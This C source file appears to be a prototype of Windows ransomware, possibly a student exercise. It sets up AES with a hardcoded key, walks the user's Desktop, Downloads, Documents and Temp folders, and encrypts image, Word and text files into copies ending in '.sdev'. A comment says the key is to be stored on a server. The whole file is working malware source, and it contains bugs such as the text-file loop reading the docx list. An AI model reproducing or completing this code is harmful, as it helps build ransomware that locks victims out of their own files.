#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <string.h>
#include <Windows.h>
#include <locale.h>
#include <time.h>
#include "aes.h"
#include "files.h"
#include "files_enc.h"

// 파일 암호화 한테로 묶어 놓고 키를 서버에 저장해 준다.



int main() {

    uint8_t key[16] = { 0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6, 0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf, 0x4f, 0x3c };

    // 키 램던 생성
    // srand(time(NULL));
    // for(int i = 0; i < 16; i++){
    //     key[i] = rand() % 0xff;
    //     printf("0x%02x ", key[i]);
    // }
    
    static struct AES_ctx ctx;
    AES_init_ctx(&ctx, key);


    _wsetlocale(LC_ALL, L"Korean" );
    wchar_t* dirPrefix; 
    dirPrefix = (wchar_t*)malloc(sizeof(wchar_t*) * 100); 
    wcscpy(dirPrefix, L"C:\\Users\\");
    wchar_t *userName = getUserName();
    wcscat(dirPrefix, userName);
    wcscat(dirPrefix, L"\\test_folder");

    struct FILEDIR fileDir;
    struct FILES files;
    files.doc_index, files.docx_index, files.jpg_index, files.png_index, files.txt_index = 0;

    //[1] Desktop
    wchar_t* dir = (wchar_t*)calloc(100, sizeof(wchar_t));
    wcscpy(dir, dirPrefix);
    wcscat(dir, DESKTOP_DIR);
    getDirectoryFileList(dir, fileDir.desktop);
    classifyFiles(&files, dir, fileDir.desktop);

    //[2] Downloads
    wcscpy(dir, dirPrefix);
    wcscat(dir, DOWNLOADS_DIR);
    getDirectoryFileList(dir, fileDir.downloads);
    classifyFiles(&files, dir, fileDir.downloads);

    // [3]  Documents
    wcscpy(dir, dirPrefix);
    wcscat(dir, DOCUMENTS_DIR);
    getDirectoryFileList(dir, fileDir.documents);
    classifyFiles(&files, dir, fileDir.documents);

    // [4]  AppData/Local/Temp
    wcscpy(dir, dirPrefix);
    wcscat(dir, APPDATA_DIR);
    getDirectoryFileList(dir, fileDir.appData);
    classifyFiles(&files, dir, fileDir.appData);

    free(dir);
    free(dirPrefix);


    //파일 암호화
    wchar_t desName[100];
    wchar_t resName[100]; 
    for (int i = 0; i < files.jpg_index; i++) {
        wcscpy(desName, files.jpg[i]);
        wcscat(desName, L".sdev");
        file_encrypt(&ctx, files.jpg[i], desName);
    }
    for (int i = 0; i < files.png_index; i++) {
        wcscpy(desName, files.png[i]);
        wcscat(desName, L".sdev");
        file_encrypt(&ctx, files.png[i], desName);
    }
    for (int i = 0; i < files.docx_index; i++) {
        wcscpy(desName, files.docx[i]);
        wcscat(desName, L".sdev");
        file_encrypt(&ctx, files.docx[i], desName);
    }
    for (int i = 0; i < files.txt_index; i++) {
        wcscpy(desName, files.docx[i]);
        wcscat(desName, L".sdev");
        file_encrypt(&ctx, files.txt[i], desName);
    }



}






